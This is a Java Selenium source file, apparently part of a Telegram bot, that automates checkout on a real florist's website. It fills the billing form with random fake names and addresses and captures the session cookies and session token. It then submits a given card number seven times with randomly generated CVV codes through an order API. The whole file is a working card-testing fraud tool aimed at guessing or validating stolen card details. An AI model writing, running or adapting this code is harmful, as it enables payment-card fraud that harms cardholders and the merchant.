package com.tammudu.files;
import java.util.*;
import com.tammudu.config.*;

import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.*;

import java.time.Duration;
import java.util.List;
import java.util.Random;

public class RealTimeSeleniumProcessor {
	public static String browserCookies = "";
	public static String dynSessionConf = "";

    private static WebDriver driver;
    private static WebDriverWait wait;
    private static final Random random = new Random();

    public static void preloadCheckoutPage(char firstDigit) {
        System.setProperty("webdriver.chrome.driver", "D:/MyPro1/telegrambot/drivers/chromedriver.exe");
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--remote-allow-origins=*");
        driver = new ChromeDriver(options);
        wait = new WebDriverWait(driver, Duration.ofSeconds(15));

        try {
            driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(10));
            driver.get("https://www.suzanns.com/");
//--------------------------------------page1-----------------------------------------------------------------
            // Step 1: Click random product
            wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector(".m-product-mini a.homePageEngagement")));
            List<WebElement> products = driver.findElements(By.cssSelector(".m-product-mini a.homePageEngagement"));
            if (products.isEmpty()) throw new RuntimeException("No products found on homepage.");
            WebElement randomProduct = products.get(random.nextInt(products.size()));
            randomProduct.click();
//-----------------------------------------page2--------------------------------------------------------------------
         // Step 2: Click "Pickup"
            WebElement pickupRadio = wait.until(ExpectedConditions.presenceOfElementLocated(By.id("pdpEfloristStorePickup")));
            ((JavascriptExecutor) driver).executeScript("arguments[0].scrollIntoView(true);", pickupRadio);
            wait.until(ExpectedConditions.elementToBeClickable(pickupRadio));
            ((JavascriptExecutor) driver).executeScript("arguments[0].click();", pickupRadio);
            Thread.sleep(3000);

         // Step 3: Click "Tomorrow" for pickup
            WebElement tomorrowLabel = wait.until(ExpectedConditions.elementToBeClickable(By.cssSelector("label[for='deliveryDate-ss-4']")));
            tomorrowLabel.click();
            // Optional short pause to simulate real user
            Thread.sleep(2000);

            // Step 4: Click Add to Cart
            WebElement addToCartBtn = wait.until(ExpectedConditions.presenceOfElementLocated(By.id("pdpAddToCartBtnDefault")));
            // Try clicking with JS
            try {
                ((JavascriptExecutor) driver).executeScript("arguments[0].click();", addToCartBtn);
            } catch (Exception e) {
                // Fallback to native click if JS fails
                wait.until(ExpectedConditions.elementToBeClickable(addToCartBtn)).click();
            }
   //----------------------------------------page 3---------------------------------------------------------------------------
 // Wait until Continue to Checkout button is clickable and click it
    WebElement continueBtn = wait.until(ExpectedConditions.elementToBeClickable(By.id("shoppingCartBtn2")));
    ((JavascriptExecutor) driver).executeScript("arguments[0].click();", continueBtn);
    
 // Step 6: Wait for the Card/Occasion Type select to be visible
    WebElement cardTypeSelect = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector("select.giftCardOccasionType")));
    ((JavascriptExecutor) driver).executeScript("arguments[0].scrollIntoView(true);", cardTypeSelect);

    // Step 7: Select "No Card Message"
    Select cardDropdown = new Select(cardTypeSelect);
    cardDropdown.selectByVisibleText("No Card Message");

    // Step 8: Wait 1 second (to allow any dynamic scripts to finish)
    Thread.sleep(1000);

    // Step 9: Click the "Next: Billing & Review" button
    WebElement nextButton = wait.until(ExpectedConditions.elementToBeClickable(By.cssSelector("input.btn-submit.deliveryInfoBtn")));
    ((JavascriptExecutor) driver).executeScript("arguments[0].scrollIntoView(true);", nextButton);
    ((JavascriptExecutor) driver).executeScript("arguments[0].click();", nextButton);
    
 // Step: Wait for billing page to load
    wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("ccTypeDropDown")));

    // Step: Ask the user for the first digit of their card


    // Step: Select Payment Type based on first digit
    Select cardTypeDropdown = new Select(driver.findElement(By.id("ccTypeDropDown")));
    switch (firstDigit) {
        case '4': cardTypeDropdown.selectByValue("FDPYT1001"); break; // Visa
        case '5': cardTypeDropdown.selectByValue("FDPYT1002"); break; // MasterCard
        case '6': cardTypeDropdown.selectByValue("FDPYT1003"); break; // Discover
        case '3': cardTypeDropdown.selectByValue("FDPYT1007"); break; // Amex
        default: System.out.println("❌ Unsupported card type"); return;
    }

    // Step: Fill billing details with random data
    driver.findElement(By.id("first_name")).sendKeys(RandomBillingInfo.randomFirstName());
    driver.findElement(By.id("last_name")).sendKeys(RandomBillingInfo.randomLastName());
    driver.findElement(By.id("address1")).sendKeys(RandomBillingInfo.randomAddress());
    driver.findElement(By.id("city")).sendKeys(RandomBillingInfo.randomCity());
    driver.findElement(By.id("state")).sendKeys(RandomBillingInfo.randomStateCode());
    driver.findElement(By.id("zip")).sendKeys(RandomBillingInfo.randomZip());
    driver.findElement(By.id("phone_number")).sendKeys(RandomBillingInfo.randomPhone());
    driver.findElement(By.id("email")).sendKeys(RandomBillingInfo.randomEmail());

    String html = driver.getPageSource();
    dynSessionConf = org.jsoup.Jsoup.parse(html).select("input[name=_dynSessConf]").val();

    Set<Cookie> cookies = driver.manage().getCookies();
    StringBuilder cookieBuilder = new StringBuilder();
    for (Cookie cookie : cookies) {
        cookieBuilder.append(cookie.getName()).append("=").append(cookie.getValue()).append("; ");
    }
    browserCookies = cookieBuilder.toString();
    // Final Step: Preload completed
    System.out.println("✅ Pre-Load is Ready");
} catch (Exception e) {
        driver.quit();
        throw new RuntimeException("❌ Preloading failed: " + e.getMessage());
    }
}
    public static String processFetsLuckCard(String cardNumber, String expMonth, String expYear, String userCVV) {
        try {
            int cvvLength = userCVV.length();
            if (cvvLength != 3 && cvvLength != 4) {
                return "❌ Invalid CVV length provided. It must be 3 or 4 digits.";
            }

            // Convert month number to Jan, Feb, etc.
            String[] monthNames = {"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"};
            int monthIndex = Integer.parseInt(expMonth) - 1;
            if (monthIndex < 0 || monthIndex >= 12) return "❌ Invalid expiration month.";
            String monthAbbr = monthNames[monthIndex];

            // Convert year to 4-digit
            String fullYear = expYear.length() == 2 ? "20" + expYear : expYear;

            for (int i = 1; i <= 7; i++) {
                String randomCVV = generateRandomCVV(cvvLength);
                String result = PlaceOrderApiClient.submitPlaceOrderApi(cardNumber, monthAbbr, fullYear, randomCVV, browserCookies, dynSessionConf);
                System.out.println("Attempt " + i + ": " + result);
                Thread.sleep(700);
            }

            driver.quit();
            return "✅ 7 CVV attempts submitted via API successfully.";

        } catch (Exception e) {
            driver.quit();
            return "❌ Failed to complete API-based payment attempts: " + e.getMessage();
        }
    }

    private static String generateRandomCVV(int length) {
        int min = (int) Math.pow(10, length - 1);
        int max = (int) Math.pow(10, length) - 1;
        return String.valueOf(min + new Random().nextInt(max - min));
    }
}